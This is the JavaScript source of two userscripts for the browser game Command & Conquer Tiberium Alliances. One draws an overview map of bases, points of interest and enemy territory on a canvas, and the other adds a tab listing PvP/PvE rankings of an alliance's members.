						var zf = parseFloat(this.visOptions.settingsPanel.zoomFactor); 
						var alliance = md.get_Alliance(); 
						var cx = 0; 
						var cy = 0; 
						var gw = rg.get_GridWidth(); 
						var gh = rg.get_GridHeight(); 
						var hilitePois = []; 
						var sectors = this.getSectors(w); 
 
 
						ctx.clearRect(0, 0, canvas.width, canvas.height); 
 
						/* ERelationType 
						// Ally Enemy NAP Neutral None 
						// 1 3 2 4 0 
						// ClientLib.Data.MainData.GetInstance().get_Alliance().GetAllianceRelationshipsByType(webfrontend.gui.alliance.DiplomacyPage.ERelationTypeEnemy).l 
						 */ 
						this.relations.enemies = md.get_Alliance().GetAllianceRelationshipsByType(webfrontend.gui.alliance.DiplomacyPage.ERelationTypeEnemy, true).l; 
						this.relations.allies = md.get_Alliance().GetAllianceRelationshipsByType(webfrontend.gui.alliance.DiplomacyPage.ERelationTypeAlly, true).l; 
						this.relations.nap = md.get_Alliance().GetAllianceRelationshipsByType(webfrontend.gui.alliance.DiplomacyPage.ERelationTypeNAP, true).l; 
 
						this.relations.enemiesById = this.makeHash(this.relations.enemies, "OtherAllianceId"); 
						//console.log(this.relations.enemiesById); 
 
						/* for (var i in this.relations.enemies){ 
						console.log(this.relations.enemies[i]); 
						this.relations.enemies[i].Id; 
						this.relations.enemies[i].OtherAllianceName; 
						this.relations.enemies[i].OtherAllianceId; 
						} */ 
 
						if (!this.swObj.obfAllianceId) 
							this.swObj.obfAllianceId = this.getMemberNameByType(alliance, "number", 0); 
						if (!this.swObj.obfAllianceName) 
							this.swObj.obfAllianceName = this.getMemberNameByType(alliance, "string", 0); 
 
						var allianceName = alliance[this.swObj.obfAllianceName]; 
 
						var sCount = 0; 
						// Main Drawing Loop 
						for (var i in sectors) { 
							var s = sectors[i]; 
							sCount++; 
							for (var x = 0; x < 32; x++) { 
								for (var y = 0; y < 32; y++) { 
									cx = s.ConvertToWorldX(x); 
									cy = s.ConvertToWorldY(y); 
									var wObj = w.GetObjectFromPosition(cx, cy); 
									var rgObj = rg.GetObjectFromPosition(cx * gw, cy * gh); 
 
									if (wObj != null) { 
										switch (wObj.Type) { 
										case 1: { 
												// player city 
												// console.log("sector id: "+s.get_Id()); 
												var player = s.GetPlayerId(wObj); 
												var alliance = s.GetAlliance(player.Alliance); 
												if (player) 
													console.log("p" + player); 
												if (alliance) 
													console.log("a" + alliance); 
												if (alliance != null && this.visOptions.selectedAllianceId == alliance) { 
													// broken 
													ctx.fillStyle = this.visOptions.settingsPanel.highlightColor; // color var used below for POI highlighting 
													ctx.fillRect(cx * zf, cy * zf, zf, zf); 
													/* } else if (this.relations.enemiesById[allianceId]) { 
													//} else if (this.isEnemy(enemies, alliance, s)) { 
													// broken 
													console.log("Enemy found: "); 
													console.log(wObj); 
													ctx.fillStyle = this.visOptions.settingsPanel.enemyBaseColor; 
													ctx.fillRect(cx * zf, cy * zf, zf, zf); 
													 */ 
												} else { 
													if (wObj.PlayerId && s.GetPlayerId(wObj).Id == md.get_Player().id) { 
														ctx.fillStyle = this.visOptions.settingsPanel.ownBaseColor; 
													} else { 
														ctx.fillStyle = this.visOptions.settingsPanel.playerColor; 
													} 
													ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												} 
												break; 
											} 
										case 2: { 
												// forgotten base 
												ctx.fillStyle = this.visOptions.settingsPanel.baseColor; 
												ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												break; 
											} 
										case 3: { 
												// Camp/Outpost 
												// rgObj.get_VisObjectType() 15 
												// CampType 2 / 3 
												// current obf prop name GIVCUM 
												// region might have a better solution 
 
												ctx.fillStyle = (rgObj && rgObj.get_CampType && rgObj.get_CampType() == 3) ? this.visOptions.settingsPanel.outpostColor : this.visOptions.settingsPanel.campColor; 
												ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												break; 
											} 
										case 4: { 
												// POI or tunnel 
												/* 
												Type:ClientLib.Data.WorldSector.WorldObjectPointOfInterest 
												System.Int32 Id 
												ClientLib.Data.WorldSector.WorldObjectPointOfInterest.EPOIType POIType 
												System.Int32 Level 
												System.Int64 OwnerAllianceId 
												System.String OwnerAllianceName 
												System.Void .ctor (ClientLib.Data.WorldSector.ObjectType type ,ClientLib.Data.World world ,System.String details ,System.Int32 pos) 
												wObj: {} --> 
												wObj.Type: 4 
												wObj.SequenceId: 6805 
												wObj.BNDYIS: 39 
												wObj.MYTWLL: 1 
												wObj.ADKRPM: 8527 
												wObj.YQTUPE: 123 
												wObj.HIFKIQ: "Alliance Name" 
												wObj.LSVKAD: {} --> 
												 */ 
 
												//console.log("POI/Tunnel ("+cx+":"+cy+" POIType:"+wObj[this.getNameByIdx(wObj,3)]+"):\n"+this.dump(wObj,"wObj",1,true)); 
 
												if (!this.obfPOIType) { 
													this.obfPOIType = this.getNameByIdx(wObj, 3); 
												} 
												if (!this.obfWorldObjectPointOfInterestAllianceName) { 
													this.obfWorldObjectPointOfInterestAllianceName = this.getMemberNameByType(wObj, "string", 0); 
												} 
												if (!this.obfWorldObjPOIAllyId) { 
													this.obfWorldObjPOIAllyId = this.getNameByIdx(wObj, 5); 
												} 
 
												if (wObj[this.obfPOIType] == 0) { 
													// Tunnel 
													ctx.fillStyle = this.visOptions.settingsPanel.tunnelColor; 
												} else { 
													// POI 
													ctx.fillStyle = this.visOptions.settingsPanel.poiColor; 
 
													// if not checked 
													if (!this.visOptions.chk.showAlliancePois) { 
														if (this.visOptions.poi == -2) { 
															// Selected POI = << All >> 
															hilitePois.push([cx, cy]); 
														} else if (this.visOptions.poi && this.visOptions.poi == wObj[this.obfPOIType]) { 
															// for some reasons, the constants in ClientLib are off by 1 [offset corrected] 
															hilitePois.push([cx, cy]); 
														} 
														// if checked & current POI is from selected Alliance 
													} else if (wObj[this.obfWorldObjPOIAllyId] == this.visOptions.selectedAllianceId) { 
														// if a poi type is selected & current POI is selected type 
														if (this.visOptions.poi >= 0 && this.visOptions.poi == wObj[this.obfPOIType]) { 
															// Selected Alliance POI 
															hilitePois.push([cx, cy]); 
															//if show all POIs selected 
														} else if (this.visOptions.poi == -2) { 
															// Selected POI = << All >> 
															hilitePois.push([cx, cy]); 
														} else { 
															console.log("perhaps visOptions.poi is empty?!"); 
														} 
													} 
 
												} 
												ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												break; 
											} 
										} 
									} else { 
										var terr = w.GetTerritoryTypeByCoordinates(cx, cy); 
 
										/* ClientLib.Data.ETerritoryType 
										// 0 1 2 3 4 5 
										// Own, Alliance, Neutral, Enemy, SpawnZone, Restricted */ 
										switch (terr) { 
										case 0 /* ClientLib.Data.ETerritoryType.Own */ 
											: 
											{ 
												ctx.fillStyle = this.visOptions.settingsPanel.ownBaseColor; 
												ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												break; 
											} 
										case 1 /* ClientLib.Data.ETerritoryType.Alliance */ 
											: 
											{ 
												ctx.fillStyle = this.visOptions.settingsPanel.allianceTerrainColor; 
												ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												break; 
											} 
										case 2 /* ClientLib.Data.ETerritoryType.Neutral */ 
											: 
											{ 
												ctx.fillStyle = "rgba(128,128,128,0.1)"; 
												ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												break; 
											} 
										case 3 /* ClientLib.Data.ETerritoryType.Enemy */ 
											: 
											{ 
												if (w.GetOwner(cx, cy) != 1610612736) { // lol 
													ctx.fillStyle = "rgba(255,128,0,0.1)"; 
													ctx.fillRect(cx * zf, cy * zf, zf, zf); 
												} 
												break; 
											} 
											/* 
											case ClientLib.Data.ETerritoryType.SpawnZone: { // 4 
											ctx.fillStyle = "rgba(255,255,0,0.5)"; 
											ctx.fillRect(cx * zf, cy * zf, zf, zf); 
											break; 
											} 
											case ClientLib.Data.ETerritoryType.Restricted: { // 5 
											ctx.fillStyle = "rgba(255,0,255,0.5)"; 
											ctx.fillRect(cx * zf, cy * zf, zf, zf); 
											break; 
											} 
											 */ 
										} 
									} 
 
									if (rgObj != null) { 
										switch (rgObj.get_VisObjectType()) { 
											/* ClientLib.Vis.VisObject.EObjectType.RegionCityType 
											// ClientLib.Vis.VisObject.EObjectType.RegionNPCBase 
											// ClientLib.Vis.VisObject.EObjectType.RegionNPCCamp 
											// ClientLib.Vis.VisObject.EObjectType.RegionPointOfInterest */ 
										case 4: { // player 
												if (rgObj.get_Type() == 2) { 
													var allianceId = rgObj.get_AllianceId(); 
													//console.log(allianceId); 
													if (this.relations.enemiesById[allianceId] != null) { 
														//console.log("Enemy found: "); 
														//console.log(rgObj); 
														//save coords and draw later 
														if (!this.relations.enemyCoords[cx]) { 
															this.relations.enemyCoords[cx] = []; 
														} 
														this.relations.enemyCoords[cx][cy] = 1; 
													} 
													//var playerId = rgObj.get_PlayerId(); 
													//var playerName = rgObj.get_PlayerName(); 
												} else if (rgObj.get_Type() == 0) { //self 
													//if (rgObj.IsOwnBase()) { 
												} 
												break; 
											} 
										case 16: { //POI 
												if (rgObj.get_Type() == 0) { 
													//Tunnel 
												} 
												//var ownerId = rgObj.get_OwnerAllianceId(); // returns 0 if owner has no alliance 
												//var ownerName = rgObj.get_OwnerAllianceName(); // returns "" if owner has no alliance 
												break; 
											} 
										} 
									} 
								} 
							} 
						} 
 
						//console.log("Sector objects scanned: " + sCount); 
						// paint enemies 
						if (this.visOptions.showEnemies) { 
							for (cx in this.relations.enemyCoords) { 
								for (cy in this.relations.enemyCoords[cx]) { 
									ctx.fillStyle = this.visOptions.settingsPanel.enemyBaseColor; 
									ctx.fillRect(cx * zf, cy * zf, zf, zf); 
 
									if (this.visOptions.showEnemyRange) { 
										ctx.beginPath(); 
										ctx.arc(cx * zf, cy * zf, zf * 20, 0 * Math.PI, 2 * Math.PI); 
										ctx.fillStyle = "rgba(255,0,0,0.02)"; 
										//ctx.fillStyle = "rgba(255,0,0,0.01)"; 
										ctx.fill(); 
									} 
								} 
							} 
						} 
						// paint home bases 
						if (this.visOptions.chk.showOwnCities) { 
							var ownCities = md.get_Cities().get_AllCities().d; 
							for (var i in ownCities) { 
								var city = ownCities[i]; 
								var x = city.get_PosX() * zf; 
								var y = city.get_PosY() * zf; 
 
								ctx.strokeStyle = this.visOptions.settingsPanel.ownBaseColor; 
 
								ctx.beginPath(); 
								ctx.arc(x + zf / 2, y + zf / 2, zf * 20, 0 * Math.PI, 2 * Math.PI); 
								ctx.stroke(); 
 
								ctx.strokeStyle = "rgba(128,128,128,0.2)"; 
								ctx.beginPath(); 
								ctx.arc(x + zf / 2, y + zf / 2, zf * 40, 0 * Math.PI, 2 * Math.PI); 
								ctx.stroke(); 
 
							} 
						} 
 
						// paint hilited pois 
						ctx.strokeStyle = this.visOptions.settingsPanel.highlightColor; //"rgba(200,255,200,1)"; 
						ctx.lineWidth = 1; 
 
						hilitePois.forEach(function (poi) { 
							ctx.lineWidth = 1; 
							ctx.strokeRect(poi[0] * zf - 2, poi[1] * zf - 2, zf + 4, zf + 4); 
						}); 
 
						// Section Frame 
						var topX = Math.floor(vm.get_Region().get_PosX() / vm.get_Region().get_GridWidth()); 
						var topY = Math.floor(vm.get_Region().get_PosY() / vm.get_Region().get_GridHeight()); 
						var width = vm.get_Region().get_ViewWidth() / vm.get_Region().get_ZoomFactor() / vm.get_Region().get_GridWidth(); 
						var height = vm.get_Region().get_ViewHeight() / vm.get_Region().get_ZoomFactor() / vm.get_Region().get_GridHeight(); 
						//var zfh = Math.round(0.5 * this.visOptions.settingsPanel.zoomFactor); 
						var zfh = zf / 2; 
						ctx.strokeStyle = "rgba(0,255,0,0.5)"; 
						ctx.lineWidth = 1; 
						//console.log("Selection:" + topX + "," + topY + "w:" + width + "," + height); 
 
						/* broken 
						this.init_mapMouse(); 
						 */ 
 
						if (this.visOptions.chk.showSectionFrame) { 
							ctx.strokeRect(topX * zf, topY * zf, width * zf, height * zf); 
							ctx.fillStyle = "rgba(128,128,128,0.2)"; 
							ctx.fillRect(topX * zf, topY * zf, width * zf, height * zf); 
						} 
 
						//Draw Border line 1 
						if (this.visOptions.chk.showBorderLine1) { 
							var a = this.visOptions.settingsPanel.line1start.split(":"); 
							var b = this.visOptions.settingsPanel.line1end.split(":"); 
							ctx.strokeStyle = this.visOptions.settingsPanel.line1color; 
							ctx.lineWidth = zfh; 
							ctx.beginPath(); 
							ctx.moveTo(a[0] * zf + zfh, a[1] * zf + zfh); 
							ctx.lineTo(b[0] * zf + zfh, b[1] * zf + zfh); 
							ctx.stroke(); 
							ctx.lineWidth = 1; 
						} 
 
						//Draw Border line 2 
						if (this.visOptions.chk.showBorderLine2) { 
							var a = this.visOptions.settingsPanel.line2start.split(":"); 
							var b = this.visOptions.settingsPanel.line2end.split(":"); 
							ctx.strokeStyle = this.visOptions.settingsPanel.line2color; 
							ctx.lineWidth = zfh; 
							ctx.beginPath(); 
							ctx.moveTo(a[0] * zf + zfh, a[1] * zf + zfh); 
							ctx.lineTo(b[0] * zf + zfh, b[1] * zf + zfh); 
							ctx.stroke(); 
							ctx.lineWidth = 1; 
						} 
 
						this.drawingNow = false; 
					}, 
 
					getSectors : function (w) { // work around  obfuscated variable names 
						if (this.swObj.obfSectorName == null) { 
							// auto-detect sector name 
							Outer : 
							for (i in w) { 
								if (w[i].d) { 
									var maybeSector = w[i].d; 
									for (j in maybeSector) { 
										if (maybeSector[j].ConvertToWorldX) { 
											this.swObj.obfSectorName = i; 
											//console.log("Sector field:" + i); 
											break Outer; 
										} 
										break; 
									} 
								} 
							} 
						} 
						if (this.swObj.obfSectorName == null) 
							console.log("ERROR: getSectors(): obfuscated property not found!"); 
						if (this.swObj.obfSectorName != null) 
							return w[this.swObj.obfSectorName].d; 
 
						/* if (w.KIH) { // old june version 
						return w.KIH.d; 
						} else if (w.RBJXOL) { // july 
						return w.RBJXOL.d; 
						} else if (w.IWEESP) { 
						return w.IWEESP.d; // closed beta 2 world 
						} else if (w.HYMYNV) { // mid july release 
						return w.HYMYNV.d; 
						} else if (w.ONQEIH) { // july 18th 
						return w.ONQEIH.d; 
						} 
						 */ 
					}, 
 
					getAlliances : function (sector) { // work around  obfuscated variable names. sector == current sector 
						try { 
							if (typeof(sector) == "undefinied" || sector === null) { 
								console.log("ERROR: getAlliances(sector): sector is not defined!"); 
								return null; 
							} 
							if (this.swObj.obfAllianceList == null) { 
								// find alliance list dynamically 
 
								Outer : 
								for (i in sector) { 
									if (sector[i].d) { 
										var maybeAllianceList = sector[i].d; 
										for (j in maybeAllianceList) { 
											var maybeAlliance = maybeAllianceList[j]; 
											var propnames = []; 
											for (p in maybeAlliance) 
												propnames.push(p); 
											var stringpropcount = 0; 
											var stringpropname = null; 
											if (propnames.length == 13) { 
												for (k = 0; k < propnames.length; k++) { 
													if (typeof(maybeAlliance[propnames[k]]) == "string") { 
														stringpropname = propnames[k]; 
														stringpropcount++; 
													} 
												} 
												if (stringpropcount == 1) { 
													this.swObj.obfAllianceId = propnames[1]; //assuming this is allways the case :-) 
													this.swObj.obfAllianceName = stringpropname; 
													this.swObj.obfAllianceList = i; 
													//console.log("Alliances field:" + i); 
													break Outer; 
												} 
											} 
											break; // test only the first member 
										} 
									} 
								} 
 
							} 
							if (this.swObj.obfAllianceList == null) { 
								console.log("ERROR: getAlliances(): obfuscated member not found!"); 
								return null; 
							} else 
								return sector[this.swObj.obfAllianceList].d; 
							/* 
							if (sector.WGH) {// june 
							return sector.WGH.d; 
							} else if (sector.QEKQND) {//july 
							return sector.QEKQND.d; 
							} else if (sector.GGUPEV){  // closed beta 2 world 
							return sector.GGUPEV.d; 
							} else if(sector.UFVPYE) { 
							return sector.UFVPYE.d; // July 11, 2012 
							} else if(sector.UEQLAO) { 
							return sector.UEQLAO.d; // July 18th 
							} */ 
						} catch (err) { 
							console.log("getAlliances error:"); 
							console.log(err); 
						} 
					}, 
 
					makeHash : function (obj, unique) { //original key is written to the property hashKey 
						if (obj != null) { 
							try { 
								var temp = []; 
								for (var key in obj) { 
									var val = obj[key]; 
									//console.log(val); 
									if (!temp[val[unique]]) { 
										temp[val[unique]] = []; 
										for (var key2 in obj[key]) { 
											if (key2 != unique) { 
												temp[val[unique]][key2] = obj[key][key2]; 
											} else { 
												temp[val[unique]]["hashKey"] = key; 
											} 
										} 
									} else { 
										console.log("makeHash duplicate entry detected"); 
									} 
 
								} 
								//console.log(temp); 
								return temp; 
							} catch (err) { 
								console.log("makeHash error: "); 
								console.log(err); 
							} 
						} else { 
							return false; 
						} 
					}, 
 
					isEnemy : function (enemies, alliance, sector) { 
						if (alliance == null) 
							return false; 
						var enemy = enemies.l.filter(function (ele) { 
								return ele.OtherAllianceId == alliance.Id; 
							}); 
						console.log(enemy); 
						return enemy.length > 0; 
					}, 
 
					listAllAlliances : function () { 
						var alliances = []; 
						var w = ClientLib.Data.MainData.GetInstance().get_World(); 
						if (!w) 
							console.log("ERROR: get_World() failed!"); 
						var sectors = this.getSectors(w); 
						if (!sectors) 
							console.log("ERROR: getSectors() failed!"); 
						for (var i in sectors) { // m_sectors 
							var s = sectors[i]; 
							var all = this.getAlliances(s); 
							if (!all) 
								console.log("ERROR: getAlliances() failed!"); 
							for (var j in all) { // m_alliances 
								var a = all[j]; 
								alliances.push({ 
									id : a[this.swObj.obfAllianceId], 
									name : a[this.swObj.obfAllianceName] 
								}); 
							} 
						} 
						alliances.sort(function (s1, s2) { 
							var name1 = s1.name.toLowerCase(); 
							var name2 = s2.name.toLowerCase(); 
							if (name1 < name2) 
								return -1; 
							if (name1 > name2) 
								return 1; 
							return 0; 
						}); 
						var allianceMap = {}; 
						alliances.forEach(function (it) { 
							allianceMap[it.id] = it; 
						}); 
						return allianceMap; 
					}, 
 
					populateAllianceSelect : function () { 
						console.log("updating Filter"); 
						var md = ClientLib.Data.MainData.GetInstance(); 
 
						this.swObj.allianceSelect.removeAll(); 
 
						this.swObj.allianceListItem["-1"] = new qx.ui.form.ListItem("<< None >>", null, -1); 
						this.swObj.allianceSelect.add(this.swObj.allianceListItem["-1"]); 
 
						var alliances = this.listAllAlliances(); // expensive operation 
						for (i in alliances) { 
							var a = alliances[i]; 
							this.swObj.allianceListItem[a.id] = new qx.ui.form.ListItem(a.name, null, a.id); 
							if (a.id == this.visOptions.selectedAllianceId) { 
								selectedItem = tempItem; 
							} 
							this.swObj.allianceSelect.add(this.swObj.allianceListItem[a.id]); 
						} 
						if (this.visOptions.selectedAllianceId != -1) { 
							this.swObj.allianceSelect.setSelection([selectedItem]); 
						} 
						//this.swObj.allianceSelect.setEnabled(true); 
						if (this.visOptions.selectedAllianceId != -1) { 
							this.swObj.chkBoxFields.showAlliancePois.setEnabled(true); 
						} 
						//console.log([selectedItem]); 
						this.alliancesAreLoaded = true; 
					}, 
 
					findAllianceById : function (s, id) { 
						var ra = null; 
						if (id != 0) { 
							for (var x = 1; s.GetAlliance(x) != null; x++) { 
								var a = s.GetAlliance(x); 
								if (a.FGTNFZ == id) { 
									ra = a; 
								} 
							} 
						} 
						return ra; 
					}, 
 
					getMousePos : function (canvas, evt) { 
						// get canvas position 
						var cnv = canvas; 
						var top = 0; 
						var left = 0; 
						while (cnv && cnv.tagName != 'BODY') { 
							top += cnv.offsetTop; 
							left += cnv.offsetLeft; 
							cnv = cnv.offsetParent; 
						} 
 
						// return relative mouse position 
						var mouseX = evt.clientX - left + window.pageXOffset; 
						var mouseY = evt.clientY - top + window.pageYOffset; 
						return { 
							x : mouseX, 
							y : mouseY 
						}; 
					}, 
 
					saveOptions : function () { 
						for (var option in this.visOptions.settingsPanel) { 
							if (this.swObj.settingFields[option]) { 
								this.visOptions.settingsPanel[option] = this.swObj.settingFields[option].getValue(); 
							} else { 
								console.log(option + " : settingFields does not exist. (applyOptions)") 
							} 
						} 
						if (localStorage) { 
							var str = JSON.stringify(this.visOptions); 
							localStorage.setItem("TAMapStorage", str); 
						} 
					}, 
 
					toggleMap : function () { 
 
						if (this.mapBox.isVisible()) { 
							this.visOptions.mapBoxBounds = this.mapBox.getBounds(); 
							this.saveOptions(); 
							this.mapBox.close(); 
						} else { 
							this.mapBox.open(); 
						} 
						/* 
						//this.mapBox.open(); 
						//var debugOutput = ""; 
						//var sector = mainData.get_World().GetWorldSectorByCoords(current_city.get_PosX(), current_city.get_PosY()); 
						//for (i in sector.m_Objects.d) { 
						//	debugOutput += JSON.stringify(sector.m_Objects.d[i]) + "<br>"; 
						//} 
						//console.log(debugOutput); 
						// this.canvasElement.setValue(debugOutput); 
						//var canvas = this.canvasElement.getDomElement(); 
						//console.log("Canvas:" + canvas); 
						//var ctx = canvas.getContext('2d'); 
						//console.log(ctx); 
						//ctx.fillStyle = "rgb(200,0,0)"; 
						//ctx.fillRect (10, 10, 55, 50); 
						 */ 
					}, 
 
					getNameByIdx : function (object, idx) { 
						var i = 0; 
						for (var n in object) { 
							if (i == idx) 
								return n; 
							i++; 
						} 
						return null; 
					}, 
 
					getMemberNameByType : function (object, type, idx) { 
						var i = 0; 
						for (var n in object) { 
							var valueType = typeof(object[n]); 
							//console.log(n+" "+valueType); 
							if (type == valueType) { 
								if (i == idx) 
									return n; 
								i++; 
							} 
						} 
						return null; 
					}, 
 
					dump : function (object, rootName, deep, includeFunction) { 
						//console.log("dump "+rootName); 
						var dumpInternal = function (obj, path) { 
							//console.log("DEBUG: dumpInternal(obj, "+path+") ind:"+ind+", deep:"+deep+", output.length:"+s.length); 
							if (obj === null) { 
								s += "" + path + ": {null}" + "\n"; 
								return; 
							} else if (obj === undefined) { 
								s += "" + path + ": {undefined}" + "\n"; 
								return; 
							} 
							var valueType = typeof(obj); 
							switch (valueType) { 
							case "function": 
								return; 
								// try{var fr=obj();}catch(ex){var  fr=ex;} 
								// s+= "" + path +": "+ "{function} returns: "+fr + "\n";return; 
							case "object": 
								s += "" + path + ": {} -->" /*+ propValue.toString().substr(0,20)*/ 
								 + "\n"; 
								break; 
							case "boolean": 
								s += "" + path + ": " + obj.toString() + "\n"; 
								return; 
							case "number": 
								s += "" + path + ": " + obj.toString() + "\n"; 
								return; 
							case "string": 
								s += "" + path + ": \"" + obj.toString() + "\"\n"; 
								return; 
							default: 
								s += "" + path + " (" + valueType + "): " + obj.toString() + "\n"; 
								return; 
							} 
 
							for (var o in objs) { 
								if (o === obj) { 
									s += "{!Recursion stoped!}\n"; 
									return; 
								} else 
									objs.push(obj); 
							} 
							var members = []; 
							for (var p in obj) 
								members.push(p); 
							if (members.length > 1000) { 
								console.log("WARNING: dump() Too much members! " + members.length); 
								return; 
							} //TODO 
							if (deep > 0 && ind >= deep) 
								return; 
							if (/.GHPRYH$/.test()) 
								return; //TODO 
							if (path.length > 30) { 
								console.log("WARNING: dump() Path too long!"); 
								return; 
							} //TODO 
							ind++; 
							for (var propName in obj) { 
								dumpInternal(obj[propName], path + "." + propName); 
							} 
							ind--; 
						} 
						var objs = []; 
						var ind = 0; 
						var s = ""; 
						if (typeof(rootName) == 'undefined') 
							rootName = "*"; 
						if (typeof(deep) == 'undefined') 
							deep = 1; 
						if (typeof(includeFunction) == 'undefined') 
							includeFunction = false; 
						try { 
							dumpInternal(object, rootName); 
						} catch (ex) { 
							console.log("ERROR: dump() > " + ex); 
						} 
						return s; 
					} 
				} 
			}); 
 
		} 
 
		function TAMap_checkIfLoaded() { 
			try { 
				if (typeof qx != 'undefined') { 
					var a = qx.core.Init.getApplication(); 
					// application 
					var mb = qx.core.Init.getApplication().getMenuBar(); 
					if (a && mb) { 
						createMapTweak(); 
						window.TAMap.getInstance().initialize(); 
					} else 
						window.setTimeout(TAMap_checkIfLoaded, 1000); 
				} else { 
					window.setTimeout(TAMap_checkIfLoaded, 1000); 
				} 
			} catch (err) { 
				if (typeof console != 'undefined') 
					console.log(err); 
				else if (window.opera) 
					opera.postError(err); 
				else 
					GM_log(err); 
			} 
		} 
 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			window.setTimeout(TAMap_checkIfLoaded, 1000); 
		} 
	} 
	// injecting, because there seem to be problems when creating game interface with unsafeWindow 
	var TAMapScript = document.createElement("script"); 
	var txt = TAMap_mainFunction.toString(); 
	TAMapScript.innerHTML = "(" + txt + ")();"; 
	TAMapScript.type = "text/javascript"; 
	if (/commandandconquer\.com/i.test(document.domain)) { 
		document.getElementsByTagName("head")[0].appendChild(TAMapScript); 
	} 
 
})(); 




// ==UserScript== 
// @name           C&C TA PvP/PvE Ranking within the Alliance 
// @author         ViolentVin 
// @description    Shows PvP/PvE Ranking of the players alliance in the PlayerWindow  
// @namespace      pvp_rank_mod 
// @include        https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version        1.2 
// @downloadURL   https://userscripts.org/scripts/source/167987.user.js 
// @updateURL     https://userscripts.org/scripts/source/167987.meta.js 
// ==/UserScript== 
 
(function () { 
    var PvpRankMod_main = function () { 
        var allianceId = null; 
        var allianceName = null; 
        var button = null; 
        var general = null; 
        var memberCount = null; 
        var playerInfoWindow = null; 
        var playerName = null; 
        var pvpHighScoreLabel = null; 
        var rowData = null; 
        var tabView = null; 
        var dataTable = null; 
 
        function CreateMod() { 
            try { 
                console.log('PvP/PvE Ranking Mod.'); 
                var tr = qx.locale.Manager.tr; 
                playerInfoWindow = webfrontend.gui.info.PlayerInfoWindow.getInstance(); 
                general = playerInfoWindow.getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[0].getChildren()[1].getChildren()[0]; 
                tabView = playerInfoWindow.getChildren()[0]; 
                playerName = general.getChildren()[1]; 
 
                // Add button to score tab-page to redirect to score history graph of the player. 
                // ( For my own alliance only ; since only our member scores are logged external. 
                allianceName = ClientLib.Data.MainData.GetInstance().get_Alliance().get_Name(); 
                if (allianceName == 'Oldskool') { 
                    button = new qx.ui.form.Button("Score graph"); 
                    button.addListener("execute", function () { 
 
                        var link = "http://pixaqu.nl/test/tibscoreos.php?user="; 
                        link += playerName.getValue(); 
                        window.open(link, "_blank"); 
                    }); 
                    general.add(button, { 
                        row: 3, 
                        column: 1 
                    }); 
                } 
 
                // New PvP Ranking Tab-page 
                var pvpRankingTab = new qx.ui.tabview.Page("Ranking"); 
                pvpRankingTab.setLayout(new qx.ui.layout.Canvas()); 
                pvpRankingTab.setPaddingTop(6); 
                pvpRankingTab.setPaddingLeft(8); 
                pvpRankingTab.setPaddingRight(10); 
                pvpRankingTab.setPaddingBottom(8); 
 
                // Label PvP Ranking 
                pvpHighScoreLabel = new qx.ui.basic.Label("PvP and PvE for alliance: ").set({ 
                    textColor: "text-value", 
                    font: "font_size_13_bold" 
                }); 
                pvpRankingTab.add(pvpHighScoreLabel); 
 
                // Table to show the PvP Scores of each player 
                dataTable = new webfrontend.data.SimpleColFormattingDataModel().set({ 
                    caseSensitiveSorting: false 
                }); 
                dataTable.setColumns(["Name", "PvP", "PvE" ], ["name", "pve", "pvp" ]); 
                var pvpTable = new webfrontend.gui.widgets.CustomTable(dataTable); 
                var columnModel = pvpTable.getTableColumnModel(); 
                columnModel.setColumnWidth(0, 200); 
                columnModel.setColumnWidth(1, 80); 
                columnModel.setColumnWidth(2, 80); 
                pvpTable.setStatusBarVisible(false); 
                pvpTable.setColumnVisibilityButtonVisible(false); 
                pvpRankingTab.add(pvpTable, { 
                    left: 0, 
                    top: 25, 
                    right: 0, 
                    bottom: 0 
                }); 
 
                // Add Tab page to the PlayerInfoWindow 
                tabView.add(pvpRankingTab); 
 
                // Hook up callback when another user has been selected 
                playerInfoWindow.addListener("close", onPlayerInfoWindowClose, this); 
                playerName.addListener("changeValue", onPlayerChanged, this); 
 
            } catch (e) { 
                console.log("CreateMod: ", e); 
            } 
        } 
 
 
        // Callback GetPublicPlayerInfoByName 
        // [bde] => Forgotten Bases Destroyed 
        // [d] => Player Bases Destroyed 
        // [n] => Player Name 
        function onPlayerInfoReceived(context, data) { 
            try { 
                var memberName = data.n 
                var pvp = data.d; 
                var pve = data.bde; 
                
                // Add player with its PvP/PvE score. 
                rowData.push([memberName, pvp, pve]); 
 
                if (rowData.length == memberCount) { 
                    // Show Alliance name in label. 
                    pvpHighScoreLabel.setValue("PvP and PvE for alliance: " + data.an); 
 
                    dataTable.setData(rowData); 
                    dataTable.sortByColumn(1, false); 
                } 
 
            } catch (e) { 
                console.log("onPlayerInfoReceived: ", e); 
            } 
        } 
 
 
        // GetPublicAllianceInfo Callback 
        // [m] => Member Array 
        // ( 
        //    [0] => Array 
        //            [n] => Name 
        // ) 
        // [mc]  => Member Count 
        function onAllianceInfoReceived(context, data) { 
            try { 
                // Crear  
                rowData = []; 
                dataTable.setData(rowData); 
 
                var members = data.m; 
                memberCount = data.mc; 
 
                for (var i in members) { 
                    var member = members[i]; 
 
                    // For Each member (player); Get the PvP/PvE Score 
                    if (member.n.length > 0) { 
                        ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicPlayerInfoByName", { 
                            name: member.n 
                        }, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onPlayerInfoReceived), null); 
                    } 
                } 
            } catch (e) { 
                console.log("onAllianceInfoReceived: ", e); 
            } 
        } 
 
        // Callback GetPublicPlayerInfoByName 
        // [a] => Alliance ID 
        // [an] => Alliance Name 
        function onPlayerAllianceIdReceived(context, data) { 
            try { 
                // No need to recreate the RankingPage when player is member of same alliance 
                if (data.a != allianceId) { 
                    allianceId = data.a; 
 
                    // Show Alliance name in label. 
                    pvpHighScoreLabel.setValue("PvP and PvE for alliance: " + data.an + "     (loading plz wait)"); 
 
                    // Get Alliance MembersList 
                    ClientLib.Net.CommunicationManager.GetInstance().SendSimpleCommand("GetPublicAllianceInfo", { 
                        id: allianceId 
                    }, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, onAllianceInfoReceived), null); 
                } 
            } catch (e) { 
                console.log("onPlayerInfoReceived: ", e); 
            } 
        } 
 
 
